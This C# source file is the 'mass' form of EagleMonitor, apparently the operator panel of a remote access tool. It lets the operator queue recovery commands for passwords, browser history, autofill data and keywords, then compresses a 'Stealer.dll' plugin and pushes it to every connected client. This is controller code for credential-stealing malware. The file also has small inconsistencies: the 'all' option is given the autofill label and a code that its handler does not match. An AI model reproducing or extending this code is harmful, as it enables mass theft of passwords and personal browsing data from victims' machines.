using EagleMonitor.Controls;
using EagleMonitor.Networking;
using PacketLib;
using PacketLib.Packet;
using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.Forms
{
    public partial class MassForm : FormPattern
    {
        public MassForm()
        {
            InitializeComponent();
        }

        private void MassForm_Load(object sender, EventArgs e)
        {
            packetGuna2ComboBox.Items.Add(PacketType.RECOVERY_PASSWORDS);
            packetGuna2ComboBox.Items.Add(PacketType.RECOVERY_HISTORY);
            packetGuna2ComboBox.Items.Add(PacketType.RECOVERY_AUTOFILL);
            packetGuna2ComboBox.Items.Add(PacketType.RECOVERY_KEYWORDS);
            packetGuna2ComboBox.Items.Add(PacketType.RECOVERY_ALL);
        }

        private void addPacketGuna2Button_Click(object sender, EventArgs e)
        {
            Program.logForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
            {
                int rowId = dataGridView1.Rows.Add();
                DataGridViewRow row = dataGridView1.Rows[rowId];

                switch (packetGuna2ComboBox.Text)
                {
                    case "RECOVERY_PASSWORDS":
                        row.Cells["Column1"].Value = ((byte)PacketType.RECOVERY_PASSWORDS);
                        row.Cells["Column2"].Value = "RECOVERY_PASSWORDS";                   
                        break;

                    case "RECOVERY_HISTORY":
                        row.Cells["Column1"].Value = ((byte)PacketType.RECOVERY_HISTORY);
                        row.Cells["Column2"].Value = "RECOVERY_HISTORY";
                        break;

                    case "RECOVERY_KEYWORDS":
                        row.Cells["Column1"].Value = ((byte)PacketType.RECOVERY_KEYWORDS);//54
                        row.Cells["Column2"].Value = "RECOVERY_KEYWORDS";
                        break;

                    case "RECOVERY_AUTOFILL":
                        row.Cells["Column1"].Value = ((byte)PacketType.RECOVERY_AUTOFILL);//53
                        row.Cells["Column2"].Value = "RECOVERY_AUTOFILL";
                        break;

                    case "RECOVERY_ALL":
                        row.Cells["Column1"].Value = ((byte)PacketType.RECOVERY_ALL);//65
                        row.Cells["Column2"].Value = "RECOVERY_AUTOFILL";
                        break;
                }
            }));
        }

        private void dataGridView1_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                DataGridView.HitTestInfo hit = dataGridView1.HitTest(e.X, e.Y);
                if (hit.Type == DataGridViewHitTestType.None)
                {
                    dataGridView1.ClearSelection();
                    dataGridView1.CurrentCell = null;
                }
            }
        }

        private void closeStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
            {
                string packetNum = dataGridViewRow.Cells[0].Value.ToString();

                switch (packetNum) 
                {
                    case "3":
                        PasswordsPacket passwordsPacket = new PasswordsPacket
                        {
                            plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
                        };

                        foreach (KeyValuePair<string, ClientHandler> client in ClientHandler.ClientHandlersList) 
                        {
                            client.Value.SendPacket(passwordsPacket);
                        }

                        break;

                    case "4":
                        HistoryPacket historyPacket = new HistoryPacket
                        {
                            plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
                        };

                        foreach (KeyValuePair<string, ClientHandler> client in ClientHandler.ClientHandlersList)
                        {
                            client.Value.SendPacket(historyPacket);
                        }

                        break;

                    case "54":
                        KeywordsPacket keywordsPacket = new KeywordsPacket
                        {
                            plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
                        };

                        foreach (KeyValuePair<string, ClientHandler> client in ClientHandler.ClientHandlersList)
                        {
                            client.Value.SendPacket(keywordsPacket);
                        }

                        break;

                    case "53":

                        AutofillPacket autofillPacket = new AutofillPacket
                        {
                            plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
                        };

                        foreach (KeyValuePair<string, ClientHandler> client in ClientHandler.ClientHandlersList)
                        {
                            client.Value.SendPacket(autofillPacket);
                        }

                        break;

                    case "66":

                        RecoveryPacket recoveryPacket = new RecoveryPacket
                        {
                            plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
                        };

                        foreach (KeyValuePair<string, ClientHandler> client in ClientHandler.ClientHandlersList)
                        {
                            client.Value.SendPacket(recoveryPacket);
                        }

                        break;
                }
            }
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }
    }
}
